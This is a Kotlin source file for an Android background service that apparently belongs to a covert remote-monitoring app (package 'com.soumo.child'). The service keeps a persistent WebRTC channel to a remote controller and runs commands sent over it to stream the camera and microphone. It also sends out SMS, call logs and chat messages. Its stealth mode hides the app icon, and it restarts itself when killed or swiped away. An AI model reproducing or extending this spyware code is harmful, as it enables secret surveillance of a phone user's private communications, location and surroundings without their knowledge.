package com.soumo.child

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.edit
import androidx.core.net.toUri
import com.google.firebase.database.FirebaseDatabase
import com.soumo.child.commands.BackgroundServiceExtendedStealthHandler
import com.soumo.child.commands.BackgroundServiceLocationHandler
import com.soumo.child.commands.BackgroundServicePermissionHandler
import com.soumo.child.commands.BackgroundServiceSettingsHandler
import com.soumo.child.commands.CommandHandler
import com.soumo.child.commands.CommandHandlerImpl
import com.soumo.child.components.calllog.CallLogSharing
import com.soumo.child.components.camera.CameraController
import com.soumo.child.components.chat.ChatMonitor
import com.soumo.child.components.chat.DataChannelClient
import com.soumo.child.components.microphone.MicrophoneController
import com.soumo.child.components.sms.SmsSharing
import com.soumo.child.configuration.AppConfig
import com.soumo.child.id.DeviceIdManager
import com.soumo.child.signaling.PeerRole
import com.soumo.child.signaling.SignalingClient
import com.soumo.child.webrtc.PeerObserver
import com.soumo.child.webrtc.PhantomPeerManager
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.webrtc.DataChannel
import org.webrtc.PeerConnection
import org.webrtc.SdpObserver
import org.webrtc.SessionDescription
import java.nio.ByteBuffer
import java.util.concurrent.atomic.AtomicBoolean

/**
  * This is a foreground service designed to maintain a persistent WebRTC connection in the background.
  *
  * ### Key Features:
  * - **Foreground Service**: Runs as a foreground service with a persistent notification to ensure the system does not terminate it.
  * - **WebRTC Management**: Manages WebRTC components such as `PeerConnection`, `DataChannel`, and media controllers for real-time communication.
  * - **Reconnection Logic**: Implements reconnection logic with exponential backoff to handle network interruptions gracefully.
  * - **Stealth Mode**: Supports stealth mode by hiding the app icon from the launcher, making the app less conspicuous.
  * - **Wake Lock**: Acquires a wake lock to keep the CPU running during critical operations, ensuring uninterrupted functionality.
  * - **Battery Optimization**: Requests the user to ignore battery optimizations for the app, preventing the system from restricting its background activities.
  * - **Resource Cleanup**: Cleans up resources when the service is destroyed and attempts to restart itself if terminated unexpectedly.
  *
  * This service is critical for maintaining a seamless and reliable background connection, especially in scenarios requiring real-time communication and persistent operations.
  */

class BackgroundService : Service() { // No binding, so return null in onBind

    companion object { // Static methods and constants
        private const val NOTIFICATION_ID = 1001 // Unique ID for the notification
        private const val CHANNEL_ID = "DeltaApp_Background" // Notification channel ID
        private const val CHANNEL_NAME = "DeltaApp Background Service" // Channel name
        private const val CHANNEL_DESCRIPTION = "Keeps DeltaApp running in background" // Channel description
        // To start the service from other components
        @Volatile
        private var isServiceRunning = AtomicBoolean(false) // Track service state
        fun startService(context: Context) { // Start service if not already running
            if (!isServiceRunning.get()) { // Prevent multiple starts
                Log.d("BackgroundService", "Starting BackgroundService...")
                val intent = Intent(context, BackgroundService::class.java) // Explicit intent
                context.startForegroundService(intent) // Start as foreground service
            }
        }

    }

    // WebRTC Components and Controllers
    private var peerMgr: PhantomPeerManager? = null // Manages PeerConnection
    private var signaling: SignalingClient? = null // Signaling via Firebase
    private var cameraCtrl: CameraController? = null // Manages camera streaming
    private var micCtrl: MicrophoneController? = null // Manages microphone streaming
    private var smsSharing: SmsSharing? = null // Manages SMS sharing
    private var callLogSharing: CallLogSharing? = null // Manages Call Log sharing
    private var dataChannel: DataChannel? = null // DataChannel for commands

    // Connection Management
    private var healthCheckJob: Job? = null // Job for health checks
    private var reconnectionJob: Job? = null // Job for reconnection attempts
    @Volatile
    private var isReconnecting = AtomicBoolean(false) // Prevent concurrent reconnects
    @Volatile
    private var reconnectionAttempts = 0 // Count of reconnection attempts
    private val maxReconnectionAttempts = 5 // Max attempts before giving up
    @Volatile private var lastPongAtMs: Long = 0L // Last pong timestamp
    private var persistentRoomId: String? = null // Persisted room ID
    private val stealthActivated = AtomicBoolean(false) // Stealth mode state

    // Coroutine Scope for background tasks
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob()) // IO dispatcher

    // Command handler for processing incoming commands
    private lateinit var commandHandler: CommandHandler // Initialized after DataChannel is ready

    // Peer Role (OFFERER or ANSWERER)
    private val peerRole = PeerRole.OFFERER // This device always initiates the connection

    // Generate or load device ID once
    private var childId: String? = null // Cached device ID

    override fun onCreate() { // Service created
        super.onCreate()
        Log.d("BackgroundService", "Service created")
        createNotificationChannel() // Setup notification channel
        startForeground(NOTIFICATION_ID, createNotification()) // Start as foreground service
        isServiceRunning.set(true) // Mark service as running
        Log.d("BackgroundService", "Foreground service started with notification")
        // Acquire wake lock for CPU intensive operations (lasting 10 minutes, will be reacquired as needed)
        acquireWakeLock() // Acquire wake lock
        // Request to ignore battery optimizations (user interaction required)
        requestIgnoreBatteryOptimizations() // Request ignore battery optimizations
        // Start background connection initialization
        serviceScope.launch { // Launch in coroutine scope
            initializeConnection() // Initialize WebRTC connection
        }
        serviceScope.launch { // Generate or load device ID once
            if (childId != null) {
                Log.d("BackgroundService", "Device ID already generated: $childId")
                return@launch // Already generated
            }
            try { // Generate unique device ID
                Log.d("BackgroundService", "🪪 Starting device ID generation...")
                val deviceId = DeviceIdManager.generateUniqueDeviceId(applicationContext) // May take time
                childId = DeviceIdManager.format(deviceId) // Format for display
                // Save to SharedPreferences for access by other components
                val prefs = getSharedPreferences("phantom_prefs", MODE_PRIVATE) // Consistent prefs name
                prefs.edit { putString("device_id", deviceId) } // Save raw ID
                Log.d("BackgroundService", "👍 Device ID generated and saved: $deviceId") // Log raw ID
                Log.i("BackgroundService", "👍 Device ID ready: $childId") // Log formatted ID
            } catch (e: Exception) { // Handle errors
                Log.e("BackgroundService", "❌ Failed to generate device ID", e) // Log error
            }
        }
        /** Note: Job scheduling should only happen in BootReceiver and PersistentJobService, to avoid infinite loops */
    }

    private var wakeLock: PowerManager.WakeLock? = null // Wake lock reference

    private fun acquireWakeLock() { // Acquire wake lock
        try { // Acquire partial wake lock
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager // Get PowerManager
            wakeLock = powerManager.newWakeLock( // Create wake lock
                PowerManager.PARTIAL_WAKE_LOCK, // Keep CPU on
                "DeltaApp::BackgroundServiceLock" // Tag for debugging
            ).apply { // Configure and acquire
                setReferenceCounted(false) // Non-reference counted
                acquire(10 * 60 * 1000L) // 10 minutes, will be reacquired
            }
            Log.d("BackgroundService", "Wake lock acquired")
        } catch (e: Exception) { // Handle errors
            wakeLock = null // Clear reference
            Log.e("BackgroundService", "Failed to acquire wake lock", e)
        }
    }

    private fun releaseWakeLock() { // Release wake lock
        try { // Release if held
            wakeLock?.let {
                if (it.isHeld) { // Check if held
                    it.release() // Release wake lock
                    Log.d("BackgroundService", "Wake lock released")
                }
            }
            wakeLock = null // Clear reference
            Log.d("BackgroundService", "Wake lock released")
        } catch (e: Exception) { // Handle errors
            Log.e("BackgroundService", "Failed to release wake lock", e)
        }
    }

    @SuppressLint("BatteryLife")
    private fun requestIgnoreBatteryOptimizations() { // Request to ignore battery optimizations
        try { // Check if already ignoring
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager // Get PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) { // Not ignoring
                Log.d("BackgroundService", "Requesting battery optimization ignore") // Log request
                val intent = Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = "package:$packageName".toUri() // Set package URI
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK // New task flag
                }
                startActivity(intent) // Start activity to request
                Log.d("BackgroundService", "Battery optimization ignore request sent")
            }
        } catch (e: Exception) { // Handle errors
            Log.e("BackgroundService", "Failed to check battery optimizations", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int { // Service started
        super.onStartCommand(intent, flags, startId)
        Log.d("BackgroundService", "Service started with flags: $flags, startId: $startId")

        // Reacquire wake lock on restart in case it was released
        acquireWakeLock() // Reacquire wake lock

        return START_STICKY // Restart service if killed by system
    }
    override fun onBind(intent: Intent?): IBinder? = null // No binding, return null
    override fun onDestroy() { // Service destroyed
        Log.d("BackgroundService", "Service destroyed")
        isServiceRunning.set(false) // Mark service as not running
        cleanupEverything() // Clean up all resources
        releaseWakeLock() // Release wake lock
        serviceScope.cancel() // Cancel all coroutines
        super.onDestroy() // Call super

        // Restart handling is delegated to BootReceiver/JobService; no AlarmManager schedule here to avoid loops
        Log.d("BackgroundService", "Service destroyed - restart handled by BootReceiver/JobService")
    }

    override fun onTaskRemoved(rootIntent: Intent?) { // App task removed (swiped away)
        Log.d("BackgroundService", "Task removed, restarting service")
        super.onTaskRemoved(rootIntent) // Call super
        // Restart service immediately when app is swiped away from recent tasks
        val restartIntent = Intent(this, BackgroundService::class.java) // Intent to restart service
        restartIntent.setPackage(packageName) // Ensure correct package
        PendingIntent.getService( // Create pending intent
            this, 1, restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE // Immutable for security
        ).apply {
            this.send() // Send intent to restart service
        }
        Log.d("BackgroundService", "Restart intent sent")
        // Alternative approach (less immediate):
        startService(restartIntent)
    }

    private fun createNotificationChannel() { // Create notification channel for foreground service
        val channel = NotificationChannel(
            CHANNEL_ID, // Unique channel ID
            CHANNEL_NAME, // User-visible name
            NotificationManager.IMPORTANCE_MIN // Minimize prominence
        ).apply { // Configure channel
            description = CHANNEL_DESCRIPTION // Description
            setShowBadge(false) // No badge for this channel
            lockscreenVisibility = Notification.VISIBILITY_PUBLIC // Show on lock screen
            enableLights(true) // Enable LED light
            enableVibration(false) // No vibration
            vibrationPattern = longArrayOf(0L) // No vibration
            setSound(null, null) // No sound
        }

        val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager // Get manager
        notificationManager.createNotificationChannel(channel) // Create channel
        Log.d("BackgroundService", "Notification channel created")
    }

    private fun createNotification(): Notification { // Create persistent notification for foreground service
        // Intent to open MainActivity when notification is tapped
        val intent = Intent(this, MainActivity::class.java).apply { // Open MainActivity
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK // Clear existing task
        }
        val pendingIntent = PendingIntent.getActivity( // Create pending intent
            this, 0, intent, // Intent to open
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE // Immutable for security
        )

        return NotificationCompat.Builder(this, CHANNEL_ID) // Build notification
            .setContentTitle("Child is crying 😭") // Title
            .setContentText("Don't you love your child? 😈") // Text
            .setSmallIcon(R.drawable.ic_launcher_foreground) // App icon
            .setContentIntent(pendingIntent) // Open MainActivity on tap
            .setTicker("DeltaApp is running in background") // Ticker text
            .setOngoing(false) // User can swipe away
            .setOngoing(false) // User can swipe away
            .setSilent(true) // No sound or vibration
            .setPriority(NotificationCompat.PRIORITY_MIN) // Minimize prominence
            .setCategory(NotificationCompat.CATEGORY_SERVICE) // Service category
            .setVisibility(NotificationCompat.VISIBILITY_PUBLIC) // Show on lock screen too
            .build() // Build notification
    }

    private suspend fun initializeConnection() { // Initialize WebRTC connection
        Log.d("BackgroundService", "Initializing background connection") // Log start
        try {
            // Load device ID from SharedPreferences
            val prefs = getSharedPreferences("phantom_prefs", MODE_PRIVATE) // Consistent prefs name
            var existingId = prefs.getString("device_id", null) // May be null if not yet generated

            if (existingId == null) { // Wait for generate device ID
                Log.w("BackgroundService", "No device ID found, waiting for generate...")
                // Wait up to 30 seconds for device ID to be generated
                var attempts = 0
                while (existingId == null && attempts < 30) {
                    delay(1000) // Wait 1 second
                    existingId = prefs.getString("device_id", null)
                    attempts++
                    Log.d("BackgroundService", "Waiting for device ID... attempt $attempts")
                }

                if (existingId == null) { // Still null after waiting
                    Log.e("BackgroundService", "Device ID still not found after 30 seconds")
                    return // Cannot proceed without device ID
                }
            }

            val rawRoomId = existingId // Use raw ID for Firebase
            val formattedRoomId = DeviceIdManager.format(existingId) // Format for display
            persistentRoomId = formattedRoomId // Save for future use

            Log.d("BackgroundService", "Using device ID from MainActivity: $existingId")
            Log.d("BackgroundService", "Formatted room ID: $formattedRoomId")
            Log.d("BackgroundService", "Using raw room ID for Firebase: $rawRoomId")

            val observer = PeerObserver( // PeerConnection observer
                onIce = { /* No-op for Non-Trickle ICE */ },
                onData = { cmd -> commandHandler.handleCommand(cmd) }, // Handle incoming commands
                onConnectionStateChange = { state -> // Connection state changes
                    Log.d("BackgroundService", "Connection state changed: $state")
                    when (state) { // Handle states
                        PeerConnection.PeerConnectionState.CONNECTED -> { // Successfully connected
                            reconnectionAttempts = 0 // Reset attempts on success
                            isReconnecting.set(false) // Clear reconnecting flag
                            reconnectionJob?.cancel() // Cancel any ongoing reconnection job
                            reconnectionJob = null // Clear job reference
                            Log.d("BackgroundService", "Reconnection attempts reset after successful connection")
                            Log.d("BackgroundService", "Connection established")
                        }

                        PeerConnection.PeerConnectionState.DISCONNECTED -> { // Disconnected
                            if (!isReconnecting.get()) { // Avoid multiple triggers
                                Log.d(
                                    "BackgroundService",
                                    "PeerConnection disconnected - scheduling restart"
                                )
                                serviceScope.launch { restartConnection() } // Restart connection
                            }
                        }

                        PeerConnection.PeerConnectionState.FAILED -> { // Connection failed
                            if (!isReconnecting.get()) { // Avoid multiple triggers
                                Log.d(
                                    "BackgroundService",
                                    "PeerConnection failed - scheduling restart"
                                )
                                serviceScope.launch { restartConnection() } // Restart connection
                            }
                        }

                        PeerConnection.PeerConnectionState.CLOSED -> { // Connection closed
                            if (!isReconnecting.get()) { // Avoid multiple triggers
                                Log.d(
                                    "BackgroundService",
                                    "PeerConnection closed - scheduling restart"
                                )
                                serviceScope.launch { restartConnection() } // Restart connection
                            }
                        }

                        else -> {
                            Log.d("BackgroundService", "Connection state: $state")
                        }
                    }
                }
            )

            // Create peer manager and PeerConnection
            peerMgr = PhantomPeerManager(this, observer).apply { // Initialize manager
                initializePeerConnectionFactory() // Init factory
                createPeerConnection(listOf( // ICE servers
                    PeerConnection.IceServer.builder(AppConfig.WebRTC.STUN_SERVERS).createIceServer() // Public STUN server
                ))
            }

            // Create controllers
            cameraCtrl = // Initialize camera controller
                CameraController(this, peerMgr!!.getFactory(), peerMgr!!.getPeerConnection()) // Pass factory and connection

            micCtrl = // Initialize microphone controller
                MicrophoneController(this, peerMgr!!.getFactory(), peerMgr!!.getPeerConnection()) // Pass factory and connection
            micCtrl!!.setRenegotiationCallback { performWebRTCRenegotiation() } // Set renegotiation callback

            // Initialize sharing components (will be set after data channel is created)
            smsSharing = null // Will be set after data channel is created
            callLogSharing = null // Will be set after data channel is created

            // Create signaling client for Non-Trickle ICE
            signaling = SignalingClient( // Initialize signaling
                roomId = rawRoomId, // Use raw ID for Firebase
                role = peerRole, // This device is always OFFERER
                onOfferReceived = { offer -> // Handle incoming offer
                    Log.d("BackgroundService", "Offer received")
                    peerMgr!!.setRemoteDescription(offer, logSdp("RemoteOffer")) // Set remote SDP
                    serviceScope.launch { // Create and send answer
                        val answer = peerMgr!!.createNonTrickleAnswer() // Create answer
                        if (answer != null) { // Successfully created
                            signaling!!.sendAnswer(answer) // Send answer
                            Log.d("BackgroundService", "Answer sent (Non-Trickle ICE)")
                        } else {
                            Log.e("BackgroundService", "Failed to create answer")
                        }
                    }
                },
                onAnswerReceived = { answer -> // Handle incoming answer
                    Log.d("BackgroundService", "Answer received") // Log reception
                    peerMgr!!.setRemoteDescription(answer, logSdp("RemoteAnswer")) // Set remote SDP
                }
            )

            if (peerRole == PeerRole.OFFERER) { // This device initiates the connection
                Log.d("BackgroundService", "Creating offer...") // Log offer creation

                // Clean up Firebase data
                FirebaseDatabase.getInstance(AppConfig.Firebase.DATABASE_URL) // Use specific database URL
                    .reference.child("calls").child(rawRoomId).removeValue() // Remove existing call data
                Log.d("BackgroundService", "Cleaned up existing Firebase call data for room: $rawRoomId")

                // Create data channel
                dataChannel = peerMgr!!.getPeerConnection()?.createDataChannel( // Create DataChannel
                    "cmd", // Label
                    DataChannel.Init().apply { ordered = true } // Reliable and ordered
                )

                // Initialize sharing components after data channel is created
                dataChannel?.let { channel -> // Ensure channel is not null
                    smsSharing = SmsSharing(this, channel) // Initialize SMS sharing
                    callLogSharing = CallLogSharing(this, channel) // Initialize Call Log sharing

                    // 🔗 Wire DataChannelClient for ChatMonitor here
                    ChatMonitor.Companion.instance.setDataChannelClient(object : DataChannelClient { // Set DataChannelClient
                        override fun send(jsonPayload: String): Boolean { // Send JSON payload
                            return if (channel.state() == DataChannel.State.OPEN) { // Ensure channel is open
                                try { // Send payload
                                    channel.send(DataChannel.Buffer(ByteBuffer.wrap(jsonPayload.toByteArray()), false)) // Send as binary
                                    Log.d("BackgroundService", "ChatMonitor payload sent: $jsonPayload") // Log sent payload
                                    true // Indicate success
                                } catch (e: Exception) { // Handle errors
                                    Log.e("BackgroundService", "Failed to send ChatMonitor payload", e)
                                    false
                                }
                            } else {
                                Log.w("BackgroundService", "ChatMonitor send failed: channel not open")
                                false // Channel not open
                            }
                        }
                    })
                }

                // Initialize CommandHandler now that DataChannel is ready
                commandHandler = CommandHandlerImpl( // Initialize command handler
                    // Initialize with all controllers and handlers
                    context = this, // Service context
                    dataChannel = dataChannel, // DataChannel for commands
                    cameraController = cameraCtrl, // Camera controller
                    microphoneController = micCtrl, // Microphone controller
                    smsSharing = smsSharing, // SMS sharing component
                    callLogSharing = callLogSharing, // Call Log sharing component
                    isBackgroundService = true, // Indicate running in background service
                    permissionHandler = BackgroundServicePermissionHandler(), // Permission handler
                    stealthHandler = BackgroundServiceExtendedStealthHandler( // Stealth mode handler
                        stealthActivated, // AtomicBoolean to track state
                        onActivate = { this@BackgroundService.activateStealthModeService() }, // Activate callback
                        onDeactivate = { this@BackgroundService.deactivateStealthModeService() }, // Deactivate callback
                        updateLastPongAtMs = { lastPongAtMs = it } // Update last pong timestamp
                    ),
                    locationHandler = BackgroundServiceLocationHandler(), // Location handler
                    settingsHandler = BackgroundServiceSettingsHandler(this) { msg -> // Settings handler with callback
                        // Callback to send messages back via DataChannel
                        sendDataChannelMessage( // Send message callback
                            msg // Message to send
                        )
                    }
                )
                Log.d("BackgroundService", "CommandHandler initialized for BackgroundService")

                dataChannel?.registerObserver(object : DataChannel.Observer { // DataChannel observer
                    override fun onStateChange() { // State changes
                        val state = dataChannel?.state() // Get current state
                        Log.d("BackgroundService", "DataChannel state: $state")
                        when (state) { // Handle states
                            DataChannel.State.OPEN -> { // Channel opened
                                Log.d("BackgroundService", "DataChannel opened")
                                lastPongAtMs = System.currentTimeMillis() // Initialize last pong timestamp
                            }
                            DataChannel.State.CLOSED -> { // Channel closed
                                Log.d("BackgroundService", "DataChannel closed - parent disconnected")
                                if (!isReconnecting.get()) { // Avoid multiple triggers
                                    serviceScope.launch { // Restart connection
                                        restartConnection() // Restart connection
                                    }
                                 }
                            }
                            else -> {
                                Log.d("BackgroundService", "DataChannel state: $state")
                            }
                        }
                    }
                    override fun onBufferedAmountChange(l: Long) {} // No-op for buffered amount changes
                    override fun onMessage(buf: DataChannel.Buffer) { // Incoming messages
                        val data = ByteArray(buf.data.remaining()) // Prepare byte array
                        buf.data.get(data) // Read data into array
                        val message = String(data) // Convert to string
                        Log.d("BackgroundService", "DataChannel message: $message")
                        commandHandler.handleCommand(message) // Handle incoming command
                        // Update last pong timestamp on any message (including pings)
                    }
                })

                // Create offer using Non-Trickle ICE
                serviceScope.launch { // Launch in coroutine
                    val offer = peerMgr!!.createNonTrickleOffer() // Create offer
                    if (offer != null) { // Successfully created
                        signaling!!.sendOffer(offer) // Send offer
                        Log.d("BackgroundService", "Offer sent (Non-Trickle ICE)")
                    } else {
                        Log.e("BackgroundService", "Failed to create offer")
                    }
                }
            }

        } catch (e: Exception) { // Handle errors
            Log.e("BackgroundService", "Error initializing connection", e)
            delay(5000) // Wait before retrying to avoid rapid loops
                initializeConnection() // Retry initialization
        }
    }

    private fun restartConnection() { // Restart WebRTC connection with exponential backoff
        Log.d("BackgroundService", "Starting connection restart...") // Log restart start
        if (isReconnecting.get()) { // Prevent concurrent restarts
            Log.d("BackgroundService", "Restart already in progress")
            return // Already reconnecting
        }

        isReconnecting.set(true) // Mark as reconnecting
        reconnectionJob?.cancel() // Cancel any existing job
        healthCheckJob?.cancel() // Cancel health check during restart

        reconnectionJob = serviceScope.launch { // Launch reconnection job
            try {
                Log.d("BackgroundService", "Cleaning up current connection...")
                cleanupCurrentConnection() // Clean up existing connection
                delay(2000) // Short delay before reinitializing

                if (!isReconnecting.get()) { // Check if restart was cancelled
                    Log.d("BackgroundService", "Restart cancelled")
                    return@launch // Exit if cancelled
                }

                Log.d("BackgroundService", "Reinitializing connection...")
                initializeConnection() // Reinitialize connection
                Log.d("BackgroundService", "Connection restart completed")
                isReconnecting.set(false) // Clear reconnecting flag
                reconnectionAttempts = 0 // Reset attempts on success

            } catch (_: CancellationException) { // Handle cancellation
                Log.d("BackgroundService", "Restart job cancelled")
                isReconnecting.set(false) // Clear reconnecting flag
            } catch (e: Exception) { // Handle other errors
                Log.e("BackgroundService", "Connection restart failed", e)
                isReconnecting.set(false) // Clear reconnecting flag
                reconnectionAttempts++ // Increment attempts
                Log.d("BackgroundService", "Reconnection attempt #$reconnectionAttempts")

                if (reconnectionAttempts < maxReconnectionAttempts) { // Retry with backoff
                    Log.d("BackgroundService", "Scheduling reconnection attempt #$reconnectionAttempts")
                    // Schedule restart with exponential backoff
                    val delayTime = 1000 * reconnectionAttempts
                    serviceScope.launch { // Launch delayed restart
                        delay(delayTime.toLong()) // Exponential backoff
                        restartConnection() // Retry restart
                    }
                } else {
                    Log.e("BackgroundService", "Max reconnection attempts reached")
                }
            }
        }
    }

    private fun cleanupCurrentConnection() { // Clean up current WebRTC connection and resources
        Log.d("BackgroundService", "Cleaning up current connection...")
        try {
            signaling?.cleanup() // Clean up signaling
            signaling = null // Clear reference
            dataChannel?.close() // Close DataChannel
            dataChannel = null // Clear reference
            peerMgr?.getPeerConnection()?.close() // Close PeerConnection
            cameraCtrl?.stopCamera() // Stop camera
            micCtrl?.stopMicrophone() // Stop microphone
            smsSharing?.stopSharing() // Stop SMS sharing
            smsSharing = null // Clear reference
            callLogSharing?.stopSharing() // Stop Call Log sharing
            callLogSharing = null // Clear reference
            Log.d("BackgroundService", "Connection cleanup completed")
        } catch (e: Exception) { // Handle errors
            Log.e("BackgroundService", "Error during cleanup", e)
        }
    }

    private fun cleanupEverything() { // Clean up all resources on service destroy
        Log.d("BackgroundService", "Cleaning up everything...")
        cleanupCurrentConnection() // Clean up current connection
        peerMgr = null // Clear peer manager
        cameraCtrl = null // Clear camera controller
        micCtrl = null // Clear microphone controller
    }

    // Stealth helpers for service context (toggle launcher component)
    private fun activateStealthModeService() { // Hide app icon by disabling launcher component
        try {
            val pm = packageManager // Get package manager
            val componentName = ComponentName(this, MainActivity::class.java) // MainActivity component
            pm.setComponentEnabledSetting( // Disable component
                componentName, // Component to disable
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, // Disable state
                PackageManager.DONT_KILL_APP // Don't kill app
            )
        } catch (e: Exception) { // Handle errors
            Log.e("StealthMode", "Failed to activate stealth mode (service)", e)
        }
    }

    private fun deactivateStealthModeService() { // Show app icon by enabling launcher component
        try { // Enable launcher component
            val pm = packageManager // Get package manager
            val componentName = ComponentName(this, MainActivity::class.java) // MainActivity component
            pm.setComponentEnabledSetting( // Enable component
                componentName, // Component to enable
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, // Enable state
                PackageManager.DONT_KILL_APP // Don't kill app
            )
        } catch (e: Exception) { // Handle errors
            Log.e("StealthMode", "Failed to deactivate stealth mode (service)", e)
        }
    }

    private fun performWebRTCRenegotiation() { // Perform WebRTC renegotiation (OFFERER only)
        Log.d("BackgroundService", "Performing WebRTC renegotiation")
        serviceScope.launch { // Launch in coroutine
            try {
                if (peerRole == PeerRole.OFFERER) { // Only OFFERER can initiate renegotiation
                    val offer = peerMgr!!.createNonTrickleOffer() // Create new offer
                    if (offer != null) { // Successfully created
                        signaling!!.sendOffer(offer) // Send new offer
                        Log.d("BackgroundService", "Renegotiation offer sent (Non-Trickle ICE)")
                    } else { // Failed to create offer
                        Log.e("BackgroundService", "Failed to create renegotiation offer")
                    }
                }
            } catch (e: Exception) { // Handle errors
                Log.e("BackgroundService", "Renegotiation error", e)
            }
        }
    }

    private fun sendDataChannelMessage(message: String) { // Send message via DataChannel
        if (dataChannel?.state() == DataChannel.State.OPEN) { // Ensure channel is open
            dataChannel?.send(DataChannel.Buffer(ByteBuffer.wrap(message.toByteArray()), false)) // Send as binary
            Log.d("BackgroundService", "DataChannel message sent: $message") // Log sent message
        }
    }

    private fun logSdp(operation: String): SdpObserver { // SDP operation logger
        return object : SdpObserver { // SDP observer
            override fun onCreateSuccess(sdp: SessionDescription) { // SDP created
                Log.d("BackgroundService", "$operation: onCreateSuccess")
            }
            override fun onSetSuccess() { // SDP set
                Log.d("BackgroundService", "$operation: onSetSuccess")
            }
            override fun onCreateFailure(error: String) { // SDP creation failed
                Log.e("BackgroundService", "$operation: onCreateFailure - $error")
            }
            override fun onSetFailure(error: String) { // SDP set failed
                Log.e("BackgroundService", "$operation: onSetFailure - $error")
            }
        }
    }
}
/** Notes:
- This service uses a foreground notification to reduce the likelihood of being killed by the system.
- It employs a robust reconnection strategy with exponential backoff to handle network disruptions.
- The service manages its own wake lock to keep the CPU awake for critical operations.
- Stealth mode is implemented by toggling the launcher component visibility.
- All long-running operations are performed in a coroutine scope to avoid blocking the main thread.
- The service cleans up all resources on destruction to prevent memory leaks.
- The service handles task removal (app swiped away) by restarting itself immediately.
- The service requests to ignore battery optimizations to improve reliability on modern Android versions.
*/